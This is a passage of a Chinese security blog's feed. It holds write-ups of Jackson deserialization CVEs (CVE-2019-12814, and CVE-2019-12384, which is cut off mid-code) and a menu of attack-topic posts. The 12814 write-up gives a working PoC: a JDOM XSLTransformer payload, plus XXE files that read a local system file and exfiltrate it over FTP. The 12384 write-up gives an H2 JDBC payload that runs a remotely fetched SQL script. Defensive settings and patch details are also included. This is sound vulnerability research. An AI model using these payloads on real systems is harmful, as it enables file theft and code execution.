    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</title>
    <link href="https://www.mi1k7ea.com/2019/11/24/Jackson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%94CVE-2019-12814%EF%BC%88%E5%9F%BA%E4%BA%8EJDOM-XSLTransformer%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/</id>
    <published>2019-11-24T09:08:45.000Z</published>
    <updated>2019-11-24T10:11:34.904Z</updated>
    
    <content type="html"><![CDATA[<p>该CVE其实是反序列化XXE导致的任意文件读取漏洞，这里简单复现分析下这条利用链。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.x系列 &lt;2.9.9.1</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>需要 JDOM 1.x 或 JDOM 2.x 的依赖支持。</p><h2 id="0x03-复现利用"><a href="#0x03-复现利用" class="headerlink" title="0x03 复现利用"></a>0x03 复现利用</h2><p>需要的jar：jackson-annotations-2.9.9，jackson-core-2.9.9，jackson-databind-2.9.9，jdom2-2.0.6。</p><p>关键PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"org.jdom2.transform.XSLTransformer"</span>, <span class="string">"http://127.0.0.1/exp.xml"</span>]</span><br></pre></td></tr></table></figure><p>完整Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        String payload = <span class="string">"[\"org.jdom2.transform.XSLTransformer\", \"http://127.0.0.1/exp.xml\"]"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object object = mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着就是XXE的FTP外带数据的参数实体解析攻击了。</p><p>exp.xml：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/evil.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>evil.dtd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; %all;</span><br></pre></td></tr></table></figure><p>开启Web服务放置exp.xml和evil.dtd，再开启FTP服务进行监听接受数据。</p><p>运行，FTP服务端即可接收到目标文件内容：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/1.png" alt=""></p><h2 id="0x04-调试分析"><a href="#0x04-调试分析" class="headerlink" title="0x04 调试分析"></a>0x04 调试分析</h2><p>前面的解析过程和之前分析的反序列化过程几乎是一样的，我们直接在newInstance()新建的实例中看到，调用到XSLTransformer类的构造函数，其中调用了newTemplates()方法来新建模板：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/2.png" alt=""></p><p>跟进newTemplates()方法，其中调用了XSLTC.compile()方法对输入参数内容进行解析：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/3.png" alt=""></p><p>跟下去，发现调用parse()函数来解析根节点的抽象语法树：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/4.png" alt=""></p><p>再跟进去看看，就是调用Parser.parse()解析XML，且调用的setFeature()设置的并不是XXE的有效防御设置，导致XXE漏洞的存在：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/5.png" alt=""></p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/6.png" alt=""></p><p>再往下，就是调用SAXParser.parse()函数来解析该XML内容了，就是XXE的触发的地方。</p><p>值得一提的是，OWASP推荐的防御XXE的setFeature()要设置下面几个值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">factory.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">factory.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">factory.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">factory.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>很明显看到，前面漏洞代码中setFeature()设置的并非前面的防御设置，因此并不能防御XXE：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String NAMESPACE_FEATURE =    <span class="string">"http://xml.org/sax/features/namespaces"</span>;</span><br></pre></td></tr></table></figure><h2 id="0x05-补丁分析"><a href="#0x05-补丁分析" class="headerlink" title="0x05 补丁分析"></a>0x05 补丁分析</h2><p>Jackson在2.9.9.1版本中添加了该JDOM类的黑名单，具体的可在jackson-databind-2.9.9.1-sources.jar!/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java中看到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [databind#2341]: jdom/jdom2 (2.9.9.1)</span></span><br><span class="line">s.add(<span class="string">"org.jdom.transform.XSLTransformer"</span>);</span><br><span class="line">s.add(<span class="string">"org.jdom2.transform.XSLTransformer"</span>);</span><br></pre></td></tr></table></figure><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://bithack.io/forum/463" target="_blank" rel="noopener">Java 反序列化漏洞始末（4）— jackson</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>个人Wiki系统</title>
    <link href="https://www.mi1k7ea.com/2019/11/22/home/"/>
    <id>https://www.mi1k7ea.com/2019/11/22/home/</id>
    <published>2019-11-22T13:32:01.396Z</published>
    <updated>2019-11-27T14:52:54.813Z</updated>
    
    <content type="html"><![CDATA[<hr><pre> __  __ _ _ _    _____          _      __        ___ _    _ |  \/  (_) | | _|___  |__  __ _( )___  \ \      / (_) | _(_)| |\/| | | | |/ /  / / _ \/ _` |// __|  \ \ /\ / /| | |/ / || |  | | | |   <  / /  __/ (_| | \__ \   \ V  V / | |   <| |<br="">|_|  |_|_|_|_|\_\/_/ \___|\__,_| |___/    \_/\_/  |_|_|\_\_|</|></pre><hr><p><strong>Email：</strong>6d69316b376561403136332e636f6d</p><hr><p><strong>Note：</strong>本站改为个人Wiki系统，将之前写的博客、知识笔记都系统归纳起来，同时会转载一些网上的总结笔记，目的在于构建知识库、以便于个人的查阅。</p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;pre&gt;
 __  __ _ _ _    _____          _      __        ___ _    _ 
|  \/  (_) | | _|___  |__  __ _( )___  \ \      / (_) | _(_)
| |\/| 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://www.mi1k7ea.com/2019/11/22/menu/"/>
    <id>https://www.mi1k7ea.com/2019/11/22/menu/</id>
    <published>2019-11-22T13:30:57.172Z</published>
    <updated>2019-12-10T14:31:56.996Z</updated>
    
    <content type="html"><![CDATA[<ul><li><strong><a href="/archives/">文章归档</a></strong></li><li><strong>Web安全</strong><ul><li>Web安全基础&amp;Tricks<ul><li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li><li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li><li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li><li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li><li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li><li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li><li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li><li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li><li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li><li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li><li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li><li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li><li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li><li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li><li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li><li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li><li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li><li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li><li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li><li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li><li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li><li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li><li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li></ul></li><li>Web安全之机器学习</li><li>WriteUp Web<ul><li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li><li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li><li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li><li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li><li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li><li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li><li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li><li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li><li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li><li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li><li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li><li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li><li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li><li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li><li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li></ul></li></ul></li><li><strong>Java</strong><ul><li>Java安全<ul><li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li><li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li><li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li><li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li><li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li><li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li><li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li><li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li><li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li><li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li><li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li><li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li><li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li><li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li><li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li><li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li><li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li><li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li><li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li><li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li><li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li><li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li><li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li><li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li><li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li><li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li><li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li><li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li><li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li><li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li></ul></li><li>Struts2</li><li>Spring<ul><li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li><li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li><li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li></ul></li><li>SpringCloud</li></ul></li><li><strong>PHP</strong><ul><li>PHP安全<ul><li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li><li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li><li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li><li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li><li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li><li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li><li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li><li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li><li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li><li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li><li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li><li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li><li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li><li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li><li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li><li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li><li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li><li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li></ul></li><li>CMS</li></ul></li><li><strong>Python</strong><ul><li>Python安全<ul><li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li><li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li><li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li><li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li></ul></li><li>安全开发<ul><li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li><li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li></ul></li><li>爬虫</li><li>Django</li></ul></li><li><strong>JavaScript</strong><ul><li>JavaScript安全<ul><li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li></ul></li><li>NodeJS</li><li>AngularJS</li></ul></li><li><strong>GO</strong><ul><li>GO安全</li></ul></li><li><strong>二进制安全</strong><ul><li>二进制基础<ul><li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li><li><a href="/2019/04/27/堆基础/">堆基础</a></li><li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li><li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li><li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li><li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li><li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li></ul></li><li>C/C++<ul><li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li></ul></li><li>逆向工程</li><li>Fuzzing</li><li>Pwn<ul><li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li><li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li><li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li><li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li><li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li><li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li><li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li><li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li><li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li><li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li></ul></li><li>WriteUp Pwn<ul><li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li></ul></li><li>WriteUp Reverse<ul><li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li></ul></li></ul></li><li><strong>渗透测试</strong><ul><li>基础&amp;Tricks</li><li>Kali</li><li>Metasploit</li><li>内网渗透</li><li>提权<ul><li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li><li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li></ul></li><li>免杀</li><li>工具</li></ul></li><li><strong>OS</strong><ul><li>Windows<ul><li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li><li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li></ul></li><li>Linux</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;/archives/&quot;&gt;文章归档&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Web安全&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;Web安全基础&amp;amp;Tricks&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;/2019/10
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Jackson系列五——CVE-2019-12384（基于logback利用链）</title>
    <link href="https://www.mi1k7ea.com/2019/11/22/Jackson%E7%B3%BB%E5%88%97%E4%BA%94%E2%80%94%E2%80%94CVE-2019-12384%EF%BC%88%E5%9F%BA%E4%BA%8Elogback%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/</id>
    <published>2019-11-22T12:52:46.000Z</published>
    <updated>2019-11-24T09:20:25.599Z</updated>
    
    <content type="html"><![CDATA[<p>本次CVE是基于logback的利用链的。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.x系列 &lt;2.9.9.1</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>需要logback和H2数据库的依赖，但是用H2嵌入式数据库的场景很少见。</p><h2 id="0x03-H2特性——用户自定义函数"><a href="#0x03-H2特性——用户自定义函数" class="headerlink" title="0x03 H2特性——用户自定义函数"></a>0x03 H2特性——用户自定义函数</h2><p>H2数据库，是Java实现的内存数据库，可作为嵌入式内存数据库，提供用户自定义数据库函数以及在数据库中注册函数的功能。</p><p>下面看看用户如何来自定义H2数据库函数的。</p><p>现在假设我们需要在H2数据库中实现Oracle的”TO_DATE”函数，那么需要的过程是这样的：</p><ol><li>使用Java实现自定义函数的方法；</li><li>将Java的自定义函数注册到H2数据库中；</li></ol><p>首先我们自定义这个函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.seraph.bi.suite.support.h2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> org.h2.tools.SimpleResultSet; </span><br><span class="line">... </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Function</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> java.sql.<span class="function">Date <span class="title">to_date</span><span class="params">(String source, String format)</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 'YYYY-MM-DD' ? Oracle format?</span></span><br><span class="line">SimpleDateFormat sdf = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd"</span>);</span><br><span class="line">java.util.Date date = sdf.parse(source);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> java.sql.Date(date.getTime());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 以上代码段是TO_DATE的实现，但用户自定义的函数需注意的是：类和方法必须是公共（Public）的，且方法需为静态（static）的，如方法中使用了Connection对象需将其关闭。</p><p>第二步，我们将其注册到数据库中，执行<code>CREATE ALIAS</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] newFunctionAliasName [<span class="keyword">DETERMINISTIC</span>] <span class="keyword">FOR</span> classAndMethodName</span><br></pre></td></tr></table></figure><p>本例的语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> <span class="keyword">TO_DATE</span> <span class="keyword">FOR</span> <span class="string">"com.seraph.bi.suite.support.h2.Function.to_date"</span>;</span><br></pre></td></tr></table></figure><p>之后，再执行类似如下语句，函数TO_DATE即可被解析了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">to_date</span>(<span class="string">'2009-1-21'</span>,<span class="string">'YYYY-MM-DD'</span>) <span class="keyword">from</span> Your_Table;</span><br></pre></td></tr></table></figure><h2 id="0x04-复现利用"><a href="#0x04-复现利用" class="headerlink" title="0x04 复现利用"></a>0x04 复现利用</h2><p>需要的jar包如下：</p><ul><li><a href="http://central.maven.org/maven2/com/fasterxml/jackson/core/jackson-databind/2.9.8/jackson-databind-2.9.8.jar" target="_blank" rel="noopener">jackson-databind-2.9.8</a></li><li><a href="http://central.maven.org/maven2/com/fasterxml/jackson/core/jackson-annotations/2.9.8/jackson-annotations-2.9.8.jar" target="_blank" rel="noopener">jackson-annotations-2.9.8</a></li><li><a href="http://central.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.9.8/jackson-core-2.9.8.jar" target="_blank" rel="noopener">jackson-core-2.9.8</a></li><li><a href="http://central.maven.org/maven2/ch/qos/logback/logback-core/1.3.0-alpha4/logback-core-1.3.0-alpha4.jar" target="_blank" rel="noopener">logback-core-1.3.0-alpha4</a></li><li><a href="http://central.maven.org/maven2/com/h2database/h2/1.4.199/h2-1.4.199.jar" target="_blank" rel="noopener">h2-1.4.199</a></li></ul><p>关键PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, &#123;<span class="attr">"url"</span>:<span class="string">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"</span>&#125;]</span><br></pre></td></tr></table></figure><p>以下Demo，先尝试向目标服务器发起请求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 